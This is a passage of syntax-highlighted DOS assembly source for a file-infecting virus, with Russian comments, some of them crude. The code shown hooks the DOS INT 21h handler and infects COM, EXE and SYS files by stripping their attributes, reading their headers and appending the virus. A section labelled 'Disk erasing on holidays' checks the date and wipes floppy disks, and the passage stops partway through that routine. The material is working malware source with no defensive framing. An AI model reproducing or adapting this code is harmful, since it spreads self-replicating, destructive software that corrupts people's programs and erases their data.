                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11001111b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10100001b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11101110b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Обработчик прерывания 21</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">tsr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">resthost</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">usual_work</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">resthost</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">keepword</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restorehost</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

 </span><span class="sc5">usual_work</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; сохранить регистры</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21</span><span class="sc0">    </span><span class="sc1">; загрузить адрес</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">prev2</span><span class="sc0">    </span><span class="sc1">; обработчика int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; и починить его</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; ищем в таблице номер</span><span class="sc0">
 </span><span class="sc5">findfunc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">funcs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc0">  </span><span class="sc1">; функции, которая сейчас</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">wrongfunc</span><span class="sc0">       </span><span class="sc1">; вызывается</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">verifymcb</span><span class="sc0">       </span><span class="sc1">; нашли - проверить mcb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">funcs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; взять смещение</span><span class="sc0">
 </span><span class="sc5">quit_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">func_jump</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; обработчика для этой функции</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                              </span><span class="sc1">; восстановить всякую лажу</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">func_number</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">func_jump</span><span class="sc0">              </span><span class="sc1">; сослаться на обработчик</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">wrongfunc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; берем следующую функцию</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">endf</span><span class="sc4">-</span><span class="sc5">funcs</span><span class="sc0">   </span><span class="sc1">; из таблицы</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">findfunc</span><span class="sc0">        </span><span class="sc1">; иссякла?</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">exithandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">quit_manager</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Infect a file</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">extinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realinfect</span><span class="sc0">

 </span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

 </span><span class="sc5">realinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; сохранить регистры</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_novell_check</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">novell</span><span class="sc0">          </span><span class="sc1">; фак ап юзер</span><span class="sc0">

 </span><span class="sc5">no_novell_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; сохранить eax,ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; засунуть в ds туда 0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; сохранить 24-й вектор</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; установить свой</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0"> </span><span class="sc1">; очень робкий и</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; стеснительный</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">          </span><span class="sc1">; анализируем имя файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; ищем у него конец</span><span class="sc0">
 </span><span class="sc5">get_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">get_end</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">got_end</span><span class="sc0">         </span><span class="sc1">; импотент?</span><span class="sc0">

 </span><span class="sc5">huy</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">noinf</span><span class="sc0">

 </span><span class="sc5">got_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; взять байт из строки</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; начало расширения?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_pixel</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'          ; начало каталога?
</span><span class="sc0">        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">huy</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">          </span><span class="sc1">; ID диска?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">huy</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; начало строки?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">got_end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">huy</span><span class="sc0">

 </span><span class="sc5">got_pixel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; взять два символа</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">           </span><span class="sc1">; расширения и ПОДНЯТЬ их</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'SYS.'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_ext</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'MOC.'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_ext</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">huy</span><span class="sc0">

 </span><span class="sc5">good_ext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">filenamecheck</span><span class="sc0">   </span><span class="sc1">; проверить файл</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">huy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; достать аттрибуты файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">huy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; сохранить их в si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; установить нормальные ones</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">huy</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; сохранить указатель и атр</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">; пытаться открыть файл</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; для чтения/записи</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restoreattr</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; положить hanlde в bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; ds и es показывают на нас</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">handlecheck</span><span class="sc0">     </span><span class="sc1">; проверить файл на предмет</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">forcedclose</span><span class="sc0">     </span><span class="sc1">; недисковости</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2eof</span><span class="sc0">        </span><span class="sc1">; слишком большой?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">           </span><span class="sc1">; а то Divide Overflow</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">           </span><span class="sc1">; начнет выебываться</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek2bof</span><span class="sc0">        </span><span class="sc1">; оттянуть конец обратно</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf?</span><span class="sc0">            </span><span class="sc1">; проверить, был ли он инфи-</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">           </span><span class="sc1">; цирован вирусом</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">          </span><span class="sc1">; считать первые 28 байт</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">           </span><span class="sc1">; в ds:original</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; все прочиталось?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc0">     </span><span class="sc1">; сделать в буфере копию</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc0">     </span><span class="sc1">; no comments</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; взять в ax первые 2 байта</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc12">'S.'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_sys</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">; так ли это?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_exe</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_exe</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cominfect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">analyse</span><span class="sc0">
 </span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exeinfect</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">analyse</span><span class="sc0">
 </span><span class="sc5">infect_sys</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sysinfect</span><span class="sc0">
 </span><span class="sc5">analyse</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close</span><span class="sc0">           </span><span class="sc1">; хоста</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writevirus</span><span class="sc0">      </span><span class="sc1">; записать вирус</span><span class="sc0">

 </span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correctdate</span><span class="sc0">
 </span><span class="sc5">forcedclose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; закрыть его - чтоб он здох</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

 </span><span class="sc5">restoreattr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; восстановить аттрибуты</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">

 </span><span class="sc5">noinf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; восстановить 24-й вектор</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc0">           </span><span class="sc1">; вернуть старый вектор</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; прерывания 24 на место</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">; восстановить регистры</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">     </span><span class="sc1">; уйти..</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Select disk</span><span class="sc0">
</span><span class="sc1">; Disk erasing on holidays</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">select</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; гибкого диска, если он устанавливается</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">not_floppy</span><span class="sc0">      </span><span class="sc1">; текущим или затираем дискету</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">          </span><span class="sc1">; опрос даты</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
